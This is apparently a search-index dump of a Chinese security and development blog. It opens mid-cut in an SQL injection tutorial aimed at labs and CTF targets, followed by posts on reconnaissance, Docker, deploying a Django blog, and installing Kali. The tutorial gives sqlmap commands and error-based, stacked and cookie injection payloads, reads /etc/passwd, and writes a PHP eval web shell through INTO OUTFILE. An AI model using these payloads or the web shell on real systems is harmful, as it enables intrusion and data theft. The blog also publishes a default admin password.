\"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3\" --tamper unmagicquotes -D sae-chinalover -T ctf4 -C flag --dump\n'''\nDatabase: sae-chinalover\nTable: ctf4\n[1 entry]\n+-------------------------+\n| flag                    |\n+-------------------------+\n| flag{this_is_sqli_flag} |\n+-------------------------+\n'''\n```\n\n**方法三**：直接查询flag字段\n\n```sql\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27\" --search -C flag\n--level 3 --risk 1 --thread 10\n'''\n--threads 10 //如果你玩过 msfconsole的话会对这个很熟悉 sqlmap线程最高设置为10\n--level 3 //sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高可到5\n--risk 3 // 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全\n--search //后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D） 如果你脑子够聪明，应该知道库列表名中可能会有ctf,flag等字样\n'''\n```\n\n## 五、报错注入\n\n### floor报错注入/双查询注入\n\n> 双查询报错/floor报错注入是由于`rand()`，`count()`，`group by` ，`floor`四个语句联合使用造成的，缺一不可。\n\n一些研究人员发现，使用`group by`子句结合`rand()`函数以及像`count（*）`这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询/floor报错注入。使用`floor()`函数只是为了将查询结果分类\n\n需用到四个函数和一个`group by`语句：\n\n1. `group by ...` --->分组语句 //将查询的结果分类汇总\n2. `rand()` --->随机数生成函数\n3. `floor()` --->取整函数 //用来对生成的随机数取整\n4. `concat()`、 `concat_ws()`--->连接字符串\n5. `count()` --->统计函数 //结合group by语句统计分组后的数据\n\n还需要了解哈`子查询`：\n\n子查询又称为内部查询，子查询允许把一个查询嵌套在另一个查询当中，简单的来说就是一个select中又嵌套了一个select，嵌套的这个select语句就是一个子查询。\n\n```sql\nselect concat(\"-\",(select database()));\n```\n\n**双查询/floor报错注入公式：**\n\n```sql\n#获取数据库名\n?id=-1' union select 1,count(*),concat_ws('-',(select database()),floor(rand(0)*2))as a from information_schema.tables group by a--+\n或者\n?id=1' and (select 1 from (select count(*),concat('~',database(),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a) --+\n\n#获取表名\n?id=-1' union select 1,count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand()*2))as a from information_schema.tables group by a--+\n或者\n?id=1'and (select 1 from (select count(*),concat('~',(select table_name from information_schema.tables where table_schema = database() limit 0,1),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a) --+\n```\n\n使用如上SQL语句，发现多查询几次会爆出`Duplicate entry`的错误，并且将我们需要的信息都爆出来了。\n\n**实例：**\n\nSQLi-LABS第五关:https://jwt1399.top/posts/30333.html#toc-heading-5\n\n**双注入详细原理请参考：**\n\n[双查询报错注入](https://www.cnblogs.com/laoxiajiadeyun/p/10278512.html)、[双查询报错注入原理探索](https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html#_caption2)\n\n### updatexml报错注入\n\n> `updatexml(xml_target, XPath_string, new_value)`：返回替换的XML片段\n\n| 参数         | 描述                          |\n| ------------ | ----------------------------- |\n| XML_document | String格式，需要操作的xml片段 |\n| XPath_string | 需要更新的xml路径(Xpath格式)  |\n| new_value    | String格式，更新后的内容      |\n\n**Payload:**\n\n```sql\nupdatexml(1,concat(0x7e,(select database()),0x7e),1);\n```\n\n![](https://img.jwt1399.top//img/20200726170613.png)\n\n如果Xpath格式语法书写错误的话，就会报错。利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。\n\n`concat()`函数是将其连成一个字符串，因此不会符合**XPATH_string**的格式，从而出现格式错误，爆出数据库\n\n`0x7e`为hex码,实为`~`,为了使Xpath格式语法书写错误\n\n### extractvalue报错注入\n\n> `extractvalue(xml_frag, xpath_expr)`：使用XPath表示法从XML字符串中提取值\n\n| 参数       | 描述                       |\n| ---------- | -------------------------- |\n| xml_frag   | 目标xml文档                |\n| xpath_expr | Xpath格式的字符串，xml路径 |\n\n**Payload:**\n\n```sql\nextractvalue(1,concat(0x7e,(select database()),0x7e));\n```\n\n![](https://img.jwt1399.top//img/20200726170721.png)\n\n如果Xpath格式语法书写错误的话，就会报错。利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。\n\n## 六、二次注入\n\n待更。。。\n\n## 七、堆叠注入\n\n### 原理\n\n在SQL中，分号（;）是用来表示一条SQL语句的结束。试想一下我们在分号（;）结束后一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。\n用户输入：`1; DELETE FROM products`\n服务器端生成的sql语句为：`select * from products where productid=1;DELETE FROM products`\n当执行查询后，第一条显示查询信息，第二条则将整个表进行删除\n\n\n\n参考[SQL注入-堆叠注入](https://www.cnblogs.com/0nth3way/articles/7128189.html#autoid-0-0-0)\n\n## 八、HTTP header注入\n\n> HTTP头注入其实并不是一个新的SQL注入类型，而是指出现SQL注入漏洞的场景。\n> 有些时候，后台开发人员为了验证客户端头信息（比如常用的cookie验证）\n> 或者通过HTTP header头信息获取客户端的一些资料，比如User-Agent、Accept字段等。\n> 会对客户端的HTTP header信息进行获取并使用SQL进行处理，如果此时没有足够的安全考虑则可能会导致基于HTTP header的SQL Inject漏洞。\n\n### Cookie 注入\n\n#### 原理\n\n**Cookie注入的原理：**\n\nphp中，使用超全局变量 `$_GET`，`$_POST`来接受参数。 asp中，使用 `Request.QueryString (GET)`或 `Request.Form (POST)`来接收页面提交的参数值。 有些程序员直接这么写：`$id = $_REQUEST['id'];`这时候PHP不知道，应该从GET还是POST方式上接收参数 ，它就会一个一个去试，它是先取GET中的数据，再取POST中的数据，还会去取Cookies中的数据，如果没有做好防护措施就容易导致存在cookie注入。\n\n**Cookie注入特征：**通过修改Cookie的值进行注入，Cookie注入跟普通sql注入过程一样\n\n**Cookie注入方法：**\n\n**方法一：**BurpSuite抓包修改Cookie进行注入\n\n**方法二：**使用SqlMap进行注入\n\n```bash\npython sqlmap.py -u \"http://xxx.com\" --cookie \"id=x\" --dbs --level 2 \n```\n\n#### 实例\n\n**题目来源：CTFHub-Web技能树-Cookie注入**\n\n题目已经很明显提示是cookie注入，打开Burpsuite抓包\n\n抓包之后可以看到cookie里面有id参数，我们尝试进行注入，果然可以成功注入\n\n![](https://img.jwt1399.top//img/20200719102419.png)\n\n后续就是修改Cookie进行普通的数字型注入就可以了\n\n```sql\n#确定字段数【字段数为2】\nCookie: id=1 order by 1\nCookie: id=1 order by 2\nCookie: id=1 order by 3\n\n#确定字段顺序\nCookie: id=-1 union select 1,2\n\n#爆数据库名【sqli】\nCookie: id=-1 union select 1,database()\n\n#爆表名【news,ztikrnhkas】\nCookie: id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'\n\n#爆列名【rcdrtihzyr】\nCookie: id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='ztikrnhkas'\n\n#爆值\nCookie: id=-1 union select 1,rcdrtihzyr from ztikrnhkas\n```\n\n![](https://img.jwt1399.top//img/20200719103005.png)\n\n\n\n### XFF注入\n\n待更。。。\n\n### UA注入\n\n待更。。。\n\n## 九、读写文件\n\n#### 读取文件函数\n\n`load_file（file_name）`：读取文件并返回该文件内容作为一个字符串。\n\n**使用前提：**\n\n- 必须有权限读取并且文件必须完全可读\n- 必须指定文件完整路径\n- 能够使用union查询（sql注入时）\n- 对Web目录有写权限用户必须有secure_file_priv=文件权限\n- 欲读取文件必须小于max_allowed_packetde的允许值\n\n**secure_file_priv的值**\n\n| 设置                   | 含义                                      |\n| ---------------------- | ----------------------------------------- |\n| secure_file_prive=null | 限制mysql不允许导入/导出                  |\n| secure_file_priv=/tmp/ | 限制mysql的导入/导出只能发生在/tmp/目录下 |\n| secure_file_priv=空    | 不限制mysql的导入/导出                    |\n\nmysql下执行`show global variables like '%secure%';`可以查看`secure_file_priv`的值\n\n\n\n#### 写文件函数\n\n`into outfile`\n\n### 实例\n\n靶机：sqli-labs第7关\n\n```mysql\n#查看页面变化，判断sql注入类别\n?id=1 and 1=1 \n?id=1 and 1=2\n#You are in.... Use outfile......\n\n#确定字段数\n?id=1' order by 3 --+\n?id=1')) order by 4  --+\n#联合查询查看显示位\n?id=-1 union select 1,2,3\n\n?id=-1')) union select 1,load_file('/etc/passwd'),3 --+\n\n?id=-1')) union select 1,('<?php @eval($_POST[\"pass\"])?>'),3  into outfile \"/var/www/html/a.php\"--+\n```\n\n### sqlmap读取文件\n\n--file-read用法用于读取本地文件\n\n```bash\npython sqlmap.py -u \"http://xxx/x?id=1\" --file-read=/etc/passwd\n```\n\n\n## 十、SQL注入靶场\n\n以下链接均为我其他文章的SQL注入靶场的学习记录\n\n**SQLi-LABS**\n\n SQLi-LABS学习笔记：https://jwt1399.top/posts/30333.html\n\n**DVWA-SQL**\n\nWeb基础漏洞-DVWA(SQL注入部分)：https://jwt1399.top/posts/27769.html#toc-heading-16\n\n**Pikachu-SQL**\n\nPikachu漏洞平台通关记录(SQL注入部分)：http://127.0.0.1:4000/posts/30313.html#toc-heading-13\n\n# 一些感悟\n\n我自己我在学习Web安全的过程中，也是倍感枯燥，总想急于求成，想要简单学一哈就能实现各种🐄🍺操作，显然不是那么容易的，所以请静下心来钻研吧，慢慢来，比较快！\n\n# 赞助💰\n\n如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["MySQL"],"categories":["SQL"]},{"title":"信息收集","url":"/posts/46544.html","content":"\n<font color=pink size=5>渗透测试的本质是信息搜集。</font> \n\n## **公司信息**\n\n公司位置、公司业务、公司核心人员、公司网站\n\n工具：[天眼查](https://www.tianyancha.com/)、[企查查](https://www.qichacha.com/)\n\n## **网站信息**\n\n工具：[站长之家](https://www.chinaz.com/)、[微步](https://x.threatbook.cn/)、[爱站](https://www.aizhan.com/)\n\n## **企业备案信息**\n\n工具：[国家企业信用信息公示系统](http://cq.gsxt.gov.cn/index.html)、[ICP备案查询](http://www.beianbeian.com/)\n\n## **网站子域名**\n\n工具：Layer子域名挖掘工具、[Sublist3r](https://github.com/aboul3la/Sublist3r)、[bugscaner](http://tools.bugscaner.com/subdomain/)\n\n## **网站架构**\n\n语言：jsp、php、asp、python。。。\n中间件：apache、iis、tomcat、jboss\n数据库：mysql、oracle、sqlserver、access）\n操作系统：linux、windows\n\n工具：浏览器插件--Wappalyzer\n\n## **OS版本、端口信息**\n\n工具：Nmap\n\nnmap -sV IP  查看端口和对应服务\n\nnmap -O IP  查看操作系统\n\n## **指纹识别**\n\n工具：[云悉](https://www.yunsee.cn/)、[Netcraft](https://sitereport.netcraft.com/)、[在线指纹识别](http://whatweb.bugscaner.com/)、Wappalyzer插件\n\n## **旁站和C段**\n\n旁站：和目标网站在同一台服务器上的其它网站\n\nC段：和目标服务器IP处于同一个网段的其它服务器\n\n查旁站:\n\nhttps://www.webscan.cc/\n\nhttp://s.tool.chinaz.com/same\n\n[查C段](https://www.maxmind.com/en/home)+nmap\n\n![](../images/%E5%AE%9E%E8%AE%AD%E7%AC%94%E8%AE%B0/image-20200601221120257.png)\n\nnmap -sP 117.50.0.0/17     -*sP*发现扫描网络存活主机\n\n## 绕过CDN寻找真实IP\n\n1、扫描子域名寻找真实IP\n\n2、国外网站多地ping\n\n[asm.ca.com](https://asm.ca.com/en/ping.php)\n\n3、查询历史域名解析记录\n\n[Netcraft](https://sitereport.netcraft.com/)、[微步](https://x.threatbook.cn/)\n\n4、phpinfo信息泄露寻找真实IP,phpinfo的server_addr记录了服务器的真实IP","tags":["信息收集"],"categories":["Web"]},{"title":"一文学会Docker使用","url":"/posts/39812.html","content":"\n## 前言\n\nDocker我以前学过，但是太久没用，忘得差不多了。。。这几天准备把写好的Django应用通过Docker部署到服务器，所以重新复习了Docker，于是写了此文，希望对想使用Docker的你有所帮助。\n\n## 初识Docker\n\n> Docker 是一个开源的应用容器引擎，Docker 可以让开发者打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。\n\nDocker 的整个生命周期由三部分组成：镜像（image）+ 容器（container）+ 仓库（repository）\n\n**镜像**是一个只读的模板，它包括了运行容器所需的数据。镜像可以包含一个完整的 Linux 操作环境，里面仅安装了 Python 或者其他用户需要的程序。\n\n**容器**是由镜像创建出来的实例，类似虚拟机，里面可以运行特定的应用，并且容器与容器是相互隔离的。\n\n**仓库**概念与 Git 和 Github 类似，如果你用过它们就非常容易理解。Docker 使用的默认仓库是由官方维护的 Docker hub 公共仓库，从中上传、拉取的操作类似 Git。\n\nlinux下docker默认的存储目录是`/var/lib/docker`\n\n存放元数据(项目源码)`/var/lib/docker/overlay2`\n\n## 安装Docker\n\n```bash\n$ curl -fsSL get.docker.com -o get-docker.sh\n$ sudo sh get-docker.sh --mirror Aliyun\n```\n\n**检验Docker是否安装成功**\n\n```python\n$ docker run hello-world\n\nUnable to find image 'hello-world:latest' locally\n......\nlatest: Pulling from library/hello-world\n1b930d010525: Pull complete \n......\nHello from Docker!\nThis message shows that your installation appears to be working correctly.\n......\n```\n\n[官方文档](https://docs.docker.com/engine/install/ubuntu/)\n\n## Docker命令\n\n### 查看本地已有镜像\n\n```bash\n$ docker images\n\nREPOSITORY      TAG        IMAGE ID           CREATED           SIZE\nhello-world     latest     fce289e99eb9       9 months ago      1.84kB\n\n# 镜像名           版本        ID 号             创建时间           大小\n```\n\n### 查看本地已有的容器\n\n```bash\n$ docker ps -a\n```\n\n### 删除镜像\n\n```bash\n$ docker rmi [images ID]  \n```\n\n### 删除容器\n\n```bash\n$ docker container rm [container ID]  \n```\n\n### 停止容器\n\n```bash\n$ docker container stop [container ID] \n```\n\n### 启动容器\n\n```bash\n$ docker container start [container ID]  \n```\n\n### 运行容器\n\n```bash\n$ docker run [options] 镜像名 /bin/bash\n```\n\n- **-i**: 交互式操作。\n- **-t**: 终端。\n- **-d:**让容器在后台运行。\n- **-P:**将容器内部使用的网络端口映射到我们使用的主机上。\n- **-p:**指定端口映射，格式为：主机(宿主)端口:容器端口\n\n[docker run 命令](https://www.runoob.com/docker/docker-run-command.html)\n\n例如：\n\n```bash\ndocker run -d -p 8000:80 --name 容器名 镜像名 #部署一个容器，并将80端口映射到宿主机的8000端口上\n\ndocker run -it ubuntu /bin/bash #使用 ubuntu 镜像启动一个容器，参数为以命令行模式进入该容器\n```\n\n## Dockerfile\n\n> Docker 允许通过文本格式的配置文件来构建镜像，默认名称为 **Dockerfile**\n\n### Dockerfile 的组成部分\n\n| 部分               | 命令                                                     |\n| ------------------ | -------------------------------------------------------- |\n| 基础镜像信息       | FROM                                                     |\n| 维护者信息         | MAINTAINER                                               |\n| 镜像操作指令       | RUN、COPY、ADD、EXPOSE、WORKDIR、ONBUILD、USER、VOLUME等 |\n| 容器启动时执行指令 | CMD、ENTRYPOINT                                          |\n\n### FROM：指定基础镜像\n\n```bash\n# 指定基础镜像\nFROM <image>\n\n# 指定一个tag版本的基础镜像\nFROM <image>:<tag>                 \n\n#例如：FROM ubuntu:18.04\n```\n\n### MAINTAINER:声明作者\n\n```bash\nMAINTAINER [name] [email]\n\n#例如 MAINTAINER jwt \"jianwentaook@163.com\"\n```\n\n### RUN：执行命令\n\n```bash\nRUN <command> \n# shell模式，以#/bin/sh -c command 形式执行, 如RUN echo hello                                                                                 \nRUN [\"executable\", \"param1\", \"param2\" ... ] \n# exec模式，指定其他形式的shell来运行指令 ,如RUN [\"/bin/bash\" ,“-c”,“echo  hello\" ]\n\n#例如：RUN apt-get update && mkdir /code  \n```\n\n### COPY：复制文件\\目录\n\n```bash\nCOPY <src> <dest>\n\n#例如：COPY index.html /test/\n```\n\n### ADD：高级复制文件\n\n```bash\nADD [--chown=<user>:<group>] <src>... <dest>\nADD [--chown=<user>:<group>] [\"<src>\",... \"<dest>\"]\n\n#例如：ADD index.html /var/www/html\n#例如：ADD /var/share/1.txt /var/www/html\n```\n\n### ENV：设置环境变量\n\n```bash\nENV <key> <value>\nENV <key>=<value> ...\n\n#例如：ENV JAVA_HOME /usr/local/jdk1.8.0_45\n#例如：ENV PYTHONUNBUFFERED 1\n```\n\n### VOLUME：定义匿名卷\n\n```bash\nVOLUME [\"/data\"]\n\n#例如：VOLUME /myvol\n#例如：VOLUME [\"/var/www\", \"/var/log/apache2\", \"/etc/apache2\"]\n```\n\n### EXPOSE：暴露端口\n\n```bash\nEXPOSE <port> [<port>/<protocol>...]\n\n#例如：EXPOSE 80 443\n#例如：EXPOSE 80/tcp\n```\n\n### WORKDIR：指定工作目录\n\n```bash\nWORKDIR /path\n\n#例如：WORKDIR /data\n```\n\n### USER：指定当前用户\n\n```bash\nUSER <user>[:<group>]\nUSER <UID>[:<GID>]\n\n#例如：USER jwt\n```\n\n### CMD：容器启动命令\n\n```bash\nCMD [\"executable\",\"param1\",\"param2\"] \nCMD [\"param1\",\"param2\"] \nCMD command param1 param2 \n\n#例如：CMD [\"/usr/bin/wc\",\"--help\"]\n#例如：CMD echo \"This is a test.\" | wc -\n```\n\n### ENTRYPOINT：入口点\n\n```bash\nENTRYPOINT [\"executable\", \"param1\", \"param2\"]\nENTRYPOINT command param1 param2\n\n#例如：ENTRYPOINT [\"top\", \"-b\"]\n#例如：ENTRYPOINT [\"/usr/sbin/apache2ctl\", \"-D\", \"FOREGROUND\"]\n```\n\n### 实例\n\n```bash\n# 从仓库拉取 带有 python 3.7 的 Linux 环境\nFROM python:3.7\n\n# 设置 python 环境变量\nENV PYTHONUNBUFFERED 1\n\n# 创建 code 文件夹并将其设置为工作目录\nRUN mkdir /code\nWORKDIR /code\n# 更新 pip\nRUN pip install pip -U\n# 将 requirements.txt 复制到容器的 code 目录\nADD requirements.txt /code/\n# 安装库\nRUN pip install -r requirements.txt\n# 将当前目录复制到容器的 code 目录\nADD . /code/\n```\n\n## Docker compose\n\n> 在线上环境中，通常不会将项目的所有组件放到同一个容器中；更好的做法是**把每个独立的功能装进单独的容器**，这样方便复用。比如将 Django 代码放到容器A，将 Mysql 数据库放到容器B，以此类推。\n\n因此同一个服务器上有可能会运行着多个容器，如果每次都靠一条条指令去启动，未免也太繁琐了。 `Docker-compose` 就是解决这个问题的，它用来编排多个容器，将启动容器的命令统一写到 `docker-compose.yml` 文件中，以后每次启动这一组容器时，只需要 `docker-compose up` 就可以了。\n\n### Ubantu安装Docker compose\n\n[官方文档 ](https://docs.docker.com/compose/install/) | [查看最新版本](https://github.com/docker/compose/releases)\n\n根据新版本的变化自行调整下面命令中的版本来安装：\n\n```bash\n# 下载docker-compose\n$ sudo curl -L \"https://github.com/docker/compose/releases/download/1.25.5/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose\n\n# 给docker-compose执行权限\n$ chmod +x /usr/local/bin/docker-compose\n\n# 查看docker compose版本，测试是否安装成功\n$ docker-compose  version\ndocker-compose version 1.25.5, build 8a1c60f6\n```\n\n### Docker compose命令\n\n### 启动容器服务\n\n```bash\n$ docker-compose up\n\n#Ctrl + C 即可停止开发服务器运行\n```\n\n### 删除容器\n\n停止服务器后实际上容器还存在，只是停止运行了而已，输入下面命令可以删除容器\n\n```bash\n$ docker-compose down\n```\n\n### 后台运行容器\n\n```bash\n$ docker-compose up -d\n```\n\n### 重新构建镜像\n\n```bash\n$ docker-compose build\n```\n\n### 启动和停止已有的容器：\n\n```bash\n$ docker-compose start\n$ docker-compose stop\n```\n\n### 查看容器日志\n\n```bash\n$ docker-compose logs\n```\n\n### 实例\n\n在项目根目录创建 **docker-compose.yml** 并写入：\n\n```yml\nversion: \"3\"\nservices:\n  app:\n    restart: always\n    build: .  # '点'代表当前目录\n    command: \"python3 manage.py runserver 0.0.0.0:8000\"\n    volumes:\n      - .:/code\n    ports:\n      - \"8000:8000\"\n```\n\n让我们来分解一下其中的各项含义。\n\n`version` 代表 docker-compose.yml 的版本，目前最新版为 3，不需要改动它。\n\n接着定义了一个名叫 `app` 的容器。后面的内容都是 `app` 容器的相关配置：\n\n- `restart` ：除正常工作外，容器会在任何时候重启，比如遭遇 bug、进程崩溃、docker 重启等情况。\n- `build` ：指定一个包含 **Dockerfile** 的路径，并通过此 Dockerfile 来构建容器镜像。注意那个 **\".\"** ,代表当前目录。\n- `command` ：容器运行时需要执行的命令。这里就是我们很熟悉的运行开发服务器了。\n- `volumes` ：**卷，这是个很重要的概念。**前面说过容器是和宿主机完全隔离的，但是有些时候又需要将其连通；比如我们开发的 Django 项目代码常常会更新，并且更新时还依赖如 Git 之类的程序，在容器里操作就显得不太方便。所以就有**卷**，它定义了宿主机和容器之间的映射：**\".\"** 表示宿主机的当前目录，**\":\"** 为分隔符，\"/code\" 表示容器中的目录。即宿主机当前目录和容器的 /code 目录是连通的，宿主机当前目录的 Django 代码更新时，容器中的 /code 目录中的代码也相应的更新了。这有点儿像是在容器上打了一个洞，某种程度上也是**实用性**和**隔离性**的一种妥协。\n\n> 严格意义上讲，这里用到的 `.:/code` 并不是**卷**，而是叫**挂载**，它两是有区别的，只不过 docker-compose 允许将挂载写到卷的配置中。后面章节会讲到。\n\n- `ports` ：定义了宿主机和容器的端口映射。容器的隔离不止环境，甚至连端口都隔离起来了。但 web 应用不通过端口跟外界通信当然不行，因此这里定义将宿主机的 8000 端口映射到容器的 8000 端口，即访问宿主机的 8000 端口就是访问到了容器的 8000 端口，但要确保端口没有被其他程序占用。\n\n## Docker 可视化\n\n> Portainer是Docker的图形化管理工具，提供状态显示面板、应用模板快速部署、容器镜像网络数据卷的基本操作（包括上传下载镜像，创建容器等操作）、事件日志显示、容器控制台操作、Swarm集群和服务等集中管理和操作、登录用户管理和控制等功能。功能十分全面，基本能满足中小型单位对容器管理的全部需求。\n\n项目地址：https://github.com/portainer/portainer\n\n官方文档：https://www.portainer.io/documentation/\n\n### 安装\n\n```bash\n# 拉取镜像\ndocker pull portainer/portainer\n\n# 一键部署\ndocker volume create portainer_data\ndocker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer\n```\n\n### 使用\n\n浏览器访问`9000`端口即可进入到Portainer界面，首次打开需要设置密码\n\n> 若无法访问，请到云服务器控制台，开启9000端口\n\n![](https://i.loli.net/2020/05/21/YGp7sS3dzCaubMo.png)\n\n单机版本选择`Local`，点击Connect即可连接到本地docker\n\n![](https://i.loli.net/2020/05/21/AC8XVlY4utNw9mS.png)\n\n登录后我们可以查看服务器上各个镜像、容器、网络、**Volume** 等信息，并可以对它们进行管理。\n![](https://i.loli.net/2020/05/21/DJmZEe2btkzcsMP.png)\n\n![](https://i.loli.net/2020/05/21/cCk57HPUdYDXxms.png)\n\n在页面上就可以直接进行容器的创建、启动、停止、删除等操作\n\n![](https://i.loli.net/2020/05/21/hRBW54fCcum1abA.png)\n\n可查看容器详细信息，还可查看 **log** 日志，甚至进入容器执行命令。\n\n![](https://i.loli.net/2020/05/21/qKBcjLRifZ6Ez3s.png)\n\n### 创建一个容器\n\n在 **Containers** 页面中，点击右上角的“**Add container**” 按钮。\n\n接着填写好容器名、镜像名、端口映射等相关信息后，点击下方的“**Deploy the container**” 后便会开始自动拉取镜像启动容器。\n\n参考：[Portainer - Docker的可视化管理工具使用详解](https://www.hangge.com/blog/cache/detail_2597.html)","tags":["Docker"],"categories":["Tools"]},{"title":"基于Django的博客开发","url":"/posts/31757.html","content":"## 前言\n\n打算密码学项目改用Django来完成，所以最近一段时间都在学习Django,学了也有一段时间了，想要找个练手的项目，网上大部分关于Django练手的项目都是写博客系统，刚好又看到国光大佬用Django改写了他的博客，于是自己也来实现一哈。\n\n## 简介\n\n项目地址：https://github.com/jwt1399/Django_Blog，麻烦给个 Star 吧，谢谢！\n\n后台：[SimpleUi](https://simpleui.88cto.com/simpleui)\n\nDjango：[Django 3.0.5](https://www.djangoproject.com/)       \n\nPython：python3.7\n\n👇 👇 👇 👇 👇 👇 👇 👇 👇\n\n👇     部署方法在文章最后     👇\n\n 👇 👇 👇 👇 👇 👇 👇 👇👇\n\n## 前端页面展示\n\n### 首页\n\n![](https://i.loli.net/2020/04/30/v81iAjyXfaOTDEM.png)\n\n![](https://i.loli.net/2020/04/30/9PBT6RwqzvruUAL.png)\n\n### 文章详情\n\n![](https://i.loli.net/2020/04/30/oZyrvMUiu1fQctK.png)\n\n### 评论\n\n![](https://i.loli.net/2020/04/30/S4Q1pJRoieqyOsU.png)\n\n### 友链\n\n![](https://i.loli.net/2020/04/30/52SQMVl4IwUtDcT.png)\n\n### 文章分类详情页\n\n![](https://i.loli.net/2020/04/30/ubRrh4qinAV3ogL.png)\n\n### 归类页\n\n![](https://i.loli.net/2020/04/30/pEIf5lxVhwMiFDA.png)\n\n### 关于页\n\n![](https://i.loli.net/2020/04/30/vXOc26i3gYtrITo.png)\n\n## 后台页面展示\n\n### 后台登录页\n\n![](https://i.loli.net/2020/04/30/FsnOIrijYU5cCmy.png)\n\n### 后台首页\n\n![](https://i.loli.net/2020/04/30/96yhb4T3nNKsR5G.png)\n\n### 文章管理\n\n![](https://i.loli.net/2020/04/30/UR6I2pTXleYy9Sf.png)\n\n### 分类\n\n![](https://i.loli.net/2020/04/30/HJwTCU42liPXZRj.png)\n\n### 友链\n\n![](https://i.loli.net/2020/04/30/rDlRJpN2yALYz3M.png)\n\n### 关于设置\n\n![](https://i.loli.net/2020/04/30/UtfSdoZbGvOwAhn.png)\n\n### 网站设置\n\n![](https://i.loli.net/2020/04/30/VAJtn5DxIYjiNH6.png)\n\n## 部署方法  👇\n\n### 安装Docker\n\n[官方文档](https://docs.docker.com/engine/install/ubuntu/)\n\n```bash\n$ curl -fsSL get.docker.com -o get-docker.sh\n$ sudo sh get-docker.sh --mirror Aliyun\n```\n\n**检验Docker是否安装成功**\n\n```python\n$ docker run hello-world\n\nUnable to find image 'hello-world:latest' locally\n...\nlatest: Pulling from library/hello-world\n1b930d010525: Pull complete \n...\n\nHello from Docker!\nThis message shows that your installation appears to be working correctly.\n...\n```\n\n### 安装Docker compose\n\n[官方文档 ](https://docs.docker.com/compose/install/) | [查看最新版本](https://github.com/docker/compose/releases)\n\n根据新版本的变化自行调整下面命令中的版本来安装：\n\n```bash\n# 下载docker-compose\n$ sudo curl -L \"https://github.com/docker/compose/releases/download/1.25.5/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose\n\n# 给docker-compose执行权限\n$ chmod +x /usr/local/bin/docker-compose\n\n# 查看docker compose版本，测试是否安装成功\n$ docker-compose  version\ndocker-compose version 1.25.5, build 8a1c60f6\ndocker-py version: 4.1.0\nCPython version: 3.7.5\nOpenSSL version: OpenSSL 1.1.0l  10 Sep 2019\n```\n\n### 安装Python3\n\n```bash\n$ sudo apt install python3\n$ sudo apt-get install python3-pip\n$ pip3 install --upgrade pip\n```\n\n### 克隆项目\n\n```bash\n$ git clone https://github.com/jwt1399/Django_Blog.git\n```\n\n## 一键部署\n\n```bash\n$ docker-compose up #构建镜像并启动容器\n```\n\n**后台默认账户/密码**\n\n账户：jwt1399\n\n密码：pyj199681..\n\n## 赞助💰\n\n如果你觉得对你有帮助，你可以赞助我一杯冰可乐吧！\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Django"],"categories":["Python"]},{"title":"Kali-2020安装及配置","url":"/posts/12095.html","content":"\n## 前言\n\n今天发现我的Kali版本是2017版，而Kali最新版已经到了2020，于是就打算重新安装一下，顺便水一篇文章，供新手参考\n\n![2017版](https://i.loli.net/2020/04/14/Lpe58r7EtqTzaAQ.png)\n\n![2020版](https://i.loli.net/2020/04/14/Du3r2Pkps9Tqw6L.png)\n\n## Kali简介\n\n> Kali Linux是基于Debian的Linux发行版，是黑客或白帽子再或者是从事安全行业的工作人员的必备神器，因为它集成了300多个开源的渗透测试的工具。在2013年，Kali Linux发布了第一个版本（1.0版），现在我所使用的是它的最新版（2020.1版）。\n\n**2020版新特性**\n\n- 默认为非root用户\n- Kali Single 安装程序镜像\n- Kali NetHunter\n- 主题和 kali-undercover 的改进\n  - 运行`kali-undercover`可以伪装成windows\n- 新工具\n\n## Kali安装\n\n### 准备工作\n\n镜像下载：https://www.kali.org/downloads/\n\n下好后放在你自己指定文件夹，方便后面管理\n\n### 创建新的虚拟机\n\n**step1：**打开VMware,新建虚拟机\n\n![](https://i.loli.net/2020/04/14/uFCnDpoWRGVHScU.png)\n\n**step2：**直接下一步\n\n![](https://i.loli.net/2020/04/14/rFGADP1B9KohbSc.png)\n\n**step3：**选择“稍后安装操作系统”\n\n![](https://i.loli.net/2020/04/14/ShmQIEvuVcnxP1z.png)\n\n**step4：**Linux内核我选择的是最新的`Debian 10.x 